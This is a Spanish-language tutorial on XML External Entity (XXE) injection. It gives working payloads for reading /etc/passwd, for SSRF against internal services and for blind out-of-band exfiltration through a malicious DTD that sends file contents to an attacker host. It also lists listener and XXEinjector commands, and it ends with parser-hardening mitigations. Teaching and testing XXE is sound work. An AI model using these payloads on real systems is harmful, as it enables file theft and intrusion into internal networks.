# XML External Entity Injection (XXE)

XXE es una vulnerabilidad que afecta a aplicaciones que procesan XML. Si el parser XML está mal configurado, un atacante puede definir **entidades externas** que hacen que el servidor lea archivos locales, realice peticiones a servicios internos (SSRF) o, en casos extremos, ejecute comandos.

---

## Conceptos previos: entidades XML

En XML, una **entidad** es como una variable que se define una vez y se referencia en el documento. Las entidades internas son inofensivas; las **externas** son las que abren la puerta a XXE.

```xml
<!-- Entidad interna (segura) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY nombre "Victor">
]>
<root><dato>&nombre;</dato></root>
```

```xml
<!-- Entidad EXTERNA (peligrosa) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY ext SYSTEM "http://attacker.com/evil.xml">
]>
<root><dato>&ext;</dato></root>
```

---

## Tipos de XXE

| Tipo | Descripción |
|---|---|
| **In-band** | El contenido del archivo o la respuesta se devuelve directamente en la respuesta HTTP. |
| **Blind (Out-of-Band)** | No hay salida directa; los datos se exfiltran por un canal externo (petición DNS/HTTP al servidor del atacante). |
| **Error-based** | Se provoca un error en el parser que incluye el contenido del archivo en el mensaje de error. |

---

## Explotación: lectura de archivos locales

### Caso básico (in-band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <campo>&xxe;</campo>
</root>
```

Si la aplicación devuelve el valor del campo en la respuesta, el contenido de `/etc/passwd` aparecerá ahí.

### Leer archivos PHP con wrappers (evita problemas de caracteres especiales)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><campo>&xxe;</campo></root>
```

La respuesta vendrá en Base64. Decodificar con:
```bash
echo "dG9vdDp4OjA6..." | base64 -d
```

---

## Explotación: SSRF (peticiones desde el servidor)

XXE puede usarse para hacer que el servidor realice peticiones HTTP internas, lo que permite explorar servicios no expuestos al exterior:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root><campo>&xxe;</campo></root>
```

Útil para acceder a paneles de administración internos, APIs de metadatos en cloud (AWS, GCP, Azure), u otros servicios internos.

---

## Explotación Blind (Out-of-Band)

Cuando la respuesta no muestra el contenido, se exfiltran datos hacia un servidor controlado por el atacante.

### Paso 1: DTD malicioso en el servidor del atacante

Crear un archivo `malicious.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://<IP_ATACANTE>/?data=%file;'>">
%eval;
%exfil;
```

### Paso 2: Payload que carga el DTD externo

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://<IP_ATACANTE>/malicious.dtd">
  %dtd;
]>
<root><campo>test</campo></root>
```

El servidor víctima cargará el DTD externo y enviará el contenido del archivo al servidor del atacante. Monitorizar con:

```bash
# Servidor HTTP básico
python3 -m http.server 80

# O con netcat para ver las peticiones raw
nc -nlvp 80
```

---

## Contextos donde aparece XXE

No solo en peticiones con `Content-Type: application/xml`. Hay que revisar:

- **Archivos de carga**: DOCX, XLSX, SVG, PDF (internamente son XML o contienen XML)
- **APIs SOAP**: usan XML como formato de mensajes
- **Peticiones JSON con parser dual**: algunos frameworks procesan XML y JSON indistintamente
- **SVG inline**: un SVG cargado en la web puede contener un DTD con entidades externas

---

## Herramientas

### xxeinjector

Automatiza la detección y explotación de XXE:
```bash
ruby XXEinjector.rb --host=<IP_ATACANTE> --httpport=80 --file=peticion.txt --path=/etc/passwd --oob=http
```

### Burp Suite

Con la extensión **XXE Injector** o manualmente en el Repeater, modificando el body XML de las peticiones capturadas.

---

## Mitigaciones

- Deshabilitar las entidades externas en el parser XML (es la solución definitiva):
  - PHP: `libxml_disable_entity_loader(true)` (PHP < 8.0); en PHP 8+ está desactivado por defecto
  - Java: `factory.setFeature("http://xml.org/sax/features/external-general-entities", false)`
  - Python: usar `defusedxml` en lugar de `xml.etree`
- Validar y rechazar DTDs en el input si no son necesarios
- Principio de mínimo privilegio para el proceso que parsea XML
- Si solo se necesita JSON, rechazar peticiones con `Content-Type: application/xml`
